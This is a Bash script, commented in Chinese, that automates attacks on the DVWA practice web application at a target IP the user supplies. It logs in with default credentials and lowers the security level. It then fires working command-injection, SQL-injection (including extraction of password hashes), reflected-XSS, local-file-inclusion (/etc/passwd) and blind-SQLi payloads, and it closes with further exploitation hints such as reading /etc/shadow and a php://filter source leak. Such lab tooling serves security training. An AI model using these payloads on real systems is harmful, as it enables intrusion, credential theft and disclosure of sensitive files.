#!/bin/bash

# DVWA 一键漏洞测试脚本
# 用法: ./test_dvwa.sh <目标IP>

TARGET="${1:-localhost}"
COOKIES="/tmp/dvwa_cookies_$$"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

cleanup() {
    rm -f "$COOKIES"
}
trap cleanup EXIT

echo -e "${GREEN}=== DVWA 漏洞测试 ===${NC}"
echo "目标: $TARGET"
echo ""

# 检查连接
if ! curl -s --connect-timeout 5 "http://$TARGET/dvwa/" > /dev/null; then
    echo -e "${RED}[ERROR] 无法连接到 $TARGET${NC}"
    exit 1
fi

# 登录
echo -e "${YELLOW}[*] 正在登录...${NC}"
TOKEN=$(curl -sL -c "$COOKIES" -b "$COOKIES" "http://$TARGET/dvwa/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
if [ -z "$TOKEN" ]; then
    echo -e "${RED}[ERROR] 获取 token 失败，请检查 DVWA 是否正常运行${NC}"
    exit 1
fi

LOGIN_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" -X POST "http://$TARGET/dvwa/login.php" \
    -d "username=admin&password=password&Login=Login&user_token=$TOKEN")

if echo "$LOGIN_RESULT" | grep -q "Login failed"; then
    echo -e "${RED}[ERROR] 登录失败${NC}"
    exit 1
fi

# 设置安全级别为 low
TOKEN=$(curl -sL -c "$COOKIES" -b "$COOKIES" "http://$TARGET/dvwa/security.php" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -sL -c "$COOKIES" -b "$COOKIES" -X POST "http://$TARGET/dvwa/security.php" \
    -d "security=low&seclev_submit=Submit&user_token=$TOKEN" -o /dev/null

echo -e "${GREEN}[+] 登录成功，安全级别已设为 low${NC}"
echo ""

# 测试 1: 命令注入
echo -e "${YELLOW}[1] 命令注入 (Command Injection)${NC}"
CMD_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" -X POST \
    "http://$TARGET/dvwa/vulnerabilities/exec/" \
    -d "ip=127.0.0.1;id&Submit=Submit" | grep -oE "uid=[0-9]+\([a-z_-]+\)[^<]*")
if [ -n "$CMD_RESULT" ]; then
    echo -e "${GREEN}    [+] 漏洞存在: $CMD_RESULT${NC}"
else
    echo -e "${RED}    [-] 测试失败${NC}"
fi
echo ""

# 测试 2: SQL 注入
echo -e "${YELLOW}[2] SQL 注入 (SQL Injection)${NC}"
SQL_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" \
    "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" | grep -c "First name:")
if [ "$SQL_RESULT" -gt 1 ]; then
    echo -e "${GREEN}    [+] 漏洞存在: 获取到 $SQL_RESULT 条用户记录${NC}"
else
    echo -e "${RED}    [-] 测试失败${NC}"
fi
echo ""

# 测试 3: SQL 注入提取密码
echo -e "${YELLOW}[3] SQL 注入 - 提取密码哈希${NC}"
HASH_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" \
    "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit" \
    | grep -oE "Surname: [a-f0-9]{32}" | head -3)
if [ -n "$HASH_RESULT" ]; then
    echo -e "${GREEN}    [+] 漏洞存在，提取到的哈希:${NC}"
    echo "$HASH_RESULT" | sed 's/^/        /'
else
    echo -e "${RED}    [-] 测试失败${NC}"
fi
echo ""

# 测试 4: 反射型 XSS
echo -e "${YELLOW}[4] 反射型 XSS (Reflected XSS)${NC}"
XSS_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" \
    "http://$TARGET/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E" \
    | grep -o "<script>alert(1)</script>")
if [ -n "$XSS_RESULT" ]; then
    echo -e "${GREEN}    [+] 漏洞存在: $XSS_RESULT${NC}"
else
    echo -e "${RED}    [-] 测试失败${NC}"
fi
echo ""

# 测试 5: 本地文件包含
echo -e "${YELLOW}[5] 本地文件包含 (LFI)${NC}"
LFI_RESULT=$(curl -sL -c "$COOKIES" -b "$COOKIES" \
    "http://$TARGET/dvwa/vulnerabilities/fi/?page=/etc/passwd" | grep -c "root:")
if [ "$LFI_RESULT" -ge 1 ]; then
    echo -e "${GREEN}    [+] 漏洞存在: 成功读取 /etc/passwd${NC}"
    curl -sL -c "$COOKIES" -b "$COOKIES" \
        "http://$TARGET/dvwa/vulnerabilities/fi/?page=/etc/passwd" | grep -E "^root:|^www-data:" | sed 's/^/        /'
else
    echo -e "${RED}    [-] 测试失败${NC}"
fi
echo ""

# 测试 6: 盲注检测
echo -e "${YELLOW}[6] SQL 盲注 (Blind SQL Injection)${NC}"
TIME1=$(curl -sL -c "$COOKIES" -b "$COOKIES" -o /dev/null -w "%{time_total}" \
    "http://$TARGET/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit")
TIME2=$(curl -sL -c "$COOKIES" -b "$COOKIES" -o /dev/null -w "%{time_total}" \
    "http://$TARGET/dvwa/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(2)--+&Submit=Submit")

TIME1_INT=$(echo "$TIME1 * 1000 / 1" | bc)
TIME2_INT=$(echo "$TIME2 * 1000 / 1" | bc)
DIFF=$((TIME2_INT - TIME1_INT))

if [ "$DIFF" -gt 1500 ]; then
    echo -e "${GREEN}    [+] 漏洞存在: 时间延迟 ${DIFF}ms${NC}"
else
    echo -e "${YELLOW}    [?] 未确认 (时间差: ${DIFF}ms)${NC}"
fi
echo ""

echo -e "${GREEN}=== 测试完成 ===${NC}"
echo ""
echo "漏洞利用提示:"
echo "  - 命令注入: ip=;cat /etc/shadow"
echo "  - SQL注入:  id=1' UNION SELECT table_name,column_name FROM information_schema.columns--"
echo "  - 文件包含: page=php://filter/convert.base64-encode/resource=../index.php"
